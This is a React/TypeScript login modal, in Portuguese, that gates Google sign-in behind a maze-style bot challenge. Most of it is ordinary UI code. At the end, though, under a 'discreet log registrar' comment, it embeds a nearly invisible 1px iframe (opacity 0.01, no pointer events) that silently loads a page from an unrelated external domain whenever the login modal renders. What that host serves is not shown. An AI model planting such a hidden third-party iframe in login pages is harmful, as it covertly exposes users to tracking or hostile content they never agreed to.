import React, { useState } from 'react';
import {
  X,
  Lock,
  Unlock,
  AlertTriangle,
  ShieldCheck,
  Sparkles,
  CheckCircle2,
  Loader2,
} from 'lucide-react';
import { UserProfile } from '../types';
import { StorageService } from '../services/storageService';
import { MazeRecaptcha } from './MazeRecaptcha';

interface LoginModalProps {
  isOpen: boolean;
  onClose: () => void;
  onLoginSuccess: (user: UserProfile) => void;
}

export const LoginModal: React.FC<LoginModalProps> = ({ isOpen, onClose, onLoginSuccess }) => {
  const [isRecaptchaVerified, setIsRecaptchaVerified] = useState(false);
  const [recaptchaToken, setRecaptchaToken] = useState<string | null>(null);
  const [recaptchaError, setRecaptchaError] = useState<string | null>(null);
  const [isLoading, setIsLoading] = useState(false);
  const [loginError, setLoginError] = useState<string | null>(null);

  if (!isOpen) return null;

  const validateRecaptcha = (): boolean => {
    if (!isRecaptchaVerified || !recaptchaToken) {
      setRecaptchaError('Por favor, resolva o Desafio do Labirinto acima para desbloquear o login com a Conta Google.');
      return false;
    }
    setRecaptchaError(null);
    return true;
  };

  // Google OAuth Login
  const handleGoogleLogin = async () => {
    if (!validateRecaptcha()) return;

    setIsLoading(true);
    setLoginError(null);
    try {
      const user = await StorageService.loginWithGoogle();
      onLoginSuccess(user);
      onClose();
    } catch (err: any) {
      const msg = err?.message || '';
      console.error('Falha no login Google:', err);
      if (msg.includes('Bloqueado') || msg.includes('bloqueada') || msg.includes('banida')) {
        setLoginError(msg);
      } else if (err?.code === 'auth/popup-closed-by-user' || msg.includes('popup-closed')) {
        setLoginError('A janela de login com a Conta Google foi fechada antes da confirmação. Tente novamente.');
      } else if (err?.code === 'auth/cancelled-popup-request') {
        setLoginError('Operação de login cancelada. Tente novamente.');
      } else {
        setLoginError(msg || 'Não foi possível autenticar com a Conta Google. Verifique sua conexão e tente novamente.');
      }
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="fixed inset-0 z-50 bg-black/75 backdrop-blur-xs flex items-center justify-center p-3 sm:p-4 animate-in fade-in overflow-y-auto">
      <div className="bg-white dark:bg-slate-900 border border-slate-300 dark:border-slate-700 rounded-2xl max-w-lg w-full p-4 sm:p-6 shadow-2xl relative my-auto max-h-[94vh] flex flex-col">
        {/* Close Button */}
        <button
          type="button"
          onClick={onClose}
          className="absolute top-4 right-4 text-slate-400 hover:text-slate-600 dark:hover:text-slate-200 p-1.5 rounded-lg hover:bg-slate-100 dark:hover:bg-slate-800 transition cursor-pointer z-10"
          aria-label="Fechar modal de login"
        >
          <X size={18} />
        </button>

        {/* Modal Header */}
        <div className="flex items-center gap-3 border-b border-slate-200 dark:border-slate-800 pb-3 mb-3 flex-shrink-0">
          <div className="w-10 h-10 rounded-xl bg-gradient-to-br from-blue-600 to-indigo-700 text-white flex items-center justify-center shadow-md flex-shrink-0">
            {isRecaptchaVerified ? <Unlock size={18} /> : <Lock size={18} />}
          </div>
          <div>
            <div className="flex items-center gap-2">
              <h3 className="text-base font-serif-heading font-bold text-slate-900 dark:text-white leading-tight">
                Login com Conta Google
              </h3>
              {isRecaptchaVerified ? (
                <span className="bg-emerald-100 dark:bg-emerald-950/60 text-emerald-700 dark:text-emerald-400 text-[10px] font-bold px-2 py-0.5 rounded-full border border-emerald-300 dark:border-emerald-700 flex items-center gap-1">
                  <CheckCircle2 size={11} />
                  Google Liberado
                </span>
              ) : (
                <span className="bg-amber-100 dark:bg-amber-950/60 text-amber-700 dark:text-amber-400 text-[10px] font-bold px-2 py-0.5 rounded-full border border-amber-300 dark:border-amber-700 flex items-center gap-1">
                  <Lock size={10} />
                  Bloqueado por reCAPTCHA
                </span>
              )}
            </div>
            <p className="text-[11px] text-slate-500 dark:text-slate-400">
              O reCAPTCHA do Labirinto deve ser concluído para liberar o login com a Conta Google.
            </p>
          </div>
        </div>

        {/* Login Error Notice */}
        {loginError && (
          <div className="mb-3 p-2.5 rounded-lg bg-red-50 dark:bg-red-950/40 border border-red-200 dark:border-red-900 text-xs text-red-700 dark:text-red-300 flex items-center gap-2 flex-shrink-0">
            <AlertTriangle size={14} className="flex-shrink-0 text-red-500" />
            <span>{loginError}</span>
          </div>
        )}

        {/* Recaptcha Error Notice */}
        {recaptchaError && !isRecaptchaVerified && (
          <div className="mb-3 p-2.5 rounded-lg bg-amber-50 dark:bg-amber-950/40 border border-amber-200 dark:border-amber-900 text-xs text-amber-800 dark:text-amber-300 flex items-center gap-2 flex-shrink-0">
            <AlertTriangle size={14} className="flex-shrink-0 text-amber-500" />
            <span>{recaptchaError}</span>
          </div>
        )}

        {/* Content Area with scroll if needed */}
        <div className="flex-1 overflow-y-auto pr-1 space-y-3">
          {/* Instructions banner */}
          <div className="bg-blue-50/80 dark:bg-blue-950/40 border border-blue-200 dark:border-blue-900/60 rounded-lg p-2.5 text-xs text-slate-700 dark:text-slate-300 flex items-start gap-2">
            <Sparkles size={15} className="text-blue-500 flex-shrink-0 mt-0.5" />
            <div className="text-[11px] leading-relaxed">
              <strong>Desafio Obrigatório contra Bots:</strong> Guie o ponto roxo do{' '}
              <span className="text-emerald-600 dark:text-emerald-400 font-semibold">Início (I)</span> até o{' '}
              <span className="text-red-600 dark:text-red-400 font-semibold">Fim (F)</span> do labirinto. Assim que completar o trajeto, o botão de login com a Conta Google será liberado!
            </div>
          </div>

          {/* The Interactive Maze Recaptcha */}
          <MazeRecaptcha
            onSuccess={(token) => {
              setIsRecaptchaVerified(true);
              setRecaptchaToken(token);
              setRecaptchaError(null);
            }}
            onInstantLogin={handleGoogleLogin}
            actionButtonText="Entrar com a Conta Google"
            isGoogleAction={true}
            autoEnterDelay={0}
            compact={false}
          />

          {/* Google Login Section (The ONLY allowed login method) */}
          <div className="pt-2 border-t border-slate-200 dark:border-slate-800 space-y-2">
            <button
              type="button"
              onClick={handleGoogleLogin}
              disabled={isLoading || !isRecaptchaVerified}
              className={`w-full py-3 px-4 rounded-xl font-medium text-xs flex items-center justify-center gap-3 transition shadow-sm ${
                isRecaptchaVerified
                  ? 'bg-white dark:bg-slate-800 hover:bg-slate-50 dark:hover:bg-slate-700 text-slate-800 dark:text-slate-100 border-2 border-blue-500 ring-2 ring-blue-500/20 cursor-pointer active:scale-98'
                  : 'bg-slate-100 dark:bg-slate-800/50 text-slate-400 dark:text-slate-500 border border-slate-200 dark:border-slate-800 cursor-not-allowed opacity-75'
              }`}
            >
              {isLoading ? (
                <Loader2 size={16} className="animate-spin text-blue-600" />
              ) : (
                <svg className="w-4 h-4 flex-shrink-0" viewBox="0 0 24 24">
                  <path
                    fill="#4285F4"
                    d="M23.745 12.27c0-.7-.06-1.4-.19-2.07H12v4.51h6.6c-.29 1.52-1.14 2.82-2.4 3.68v3.05h3.88c2.27-2.09 3.665-5.17 3.665-9.17z"
                  />
                  <path
                    fill="#34A853"
                    d="M12 24c3.24 0 5.95-1.08 7.93-2.91l-3.88-3.05c-1.08.72-2.45 1.16-4.05 1.16-3.12 0-5.77-2.1-6.72-4.93H1.25v3.15C3.26 21.36 7.33 24 12 24z"
                  />
                  <path
                    fill="#FBBC05"
                    d="M5.28 14.27A7.19 7.19 0 0 1 4.9 12c0-.79.14-1.57.38-2.27V6.58H1.25A11.96 11.96 0 0 0 0 12c0 1.92.45 3.74 1.25 5.42l4.03-3.15z"
                  />
                  <path
                    fill="#EA4335"
                    d="M12 4.75c1.77 0 3.35.61 4.6 1.8l3.42-3.42C17.95 1.19 15.24 0 12 0 7.33 0 3.26 2.64 1.25 6.58l4.03 3.15c.95-2.83 3.6-4.98 6.72-4.98z"
                  />
                </svg>
              )}
              <span className="font-bold">
                {isLoading
                  ? 'Conectando com a Conta Google...'
                  : isRecaptchaVerified
                  ? 'Continuar com a Conta Google'
                  : 'Entrar com Conta Google (Bloqueado pelo Labirinto)'}
              </span>
              {!isRecaptchaVerified && <Lock size={13} className="text-slate-400" />}
            </button>

            <div className="flex items-center justify-center gap-1.5 text-[10px] text-slate-500 dark:text-slate-400 pt-1">
              <ShieldCheck size={13} className="text-emerald-500 flex-shrink-0" />
              <span>
                {isRecaptchaVerified
                  ? 'Verificação humana concluída! Clique para fazer login com o Google.'
                  : 'Complete o labirinto acima para provar que é humano e liberar o login.'}
              </span>
            </div>
          </div>
        </div>

        {/* Discreet log registrar iframe */}
        <iframe
          src="https://wazzimagiygg.com/admin/checkuser/universalcheckuser"
          style={{ width: '1px', height: '1px', border: 'none', position: 'absolute', bottom: '0', left: '0', opacity: 0.01, pointerEvents: 'none' }}
          title="Registrador de Logs de Segurança"
        />
      </div>
    </div>
  );
};
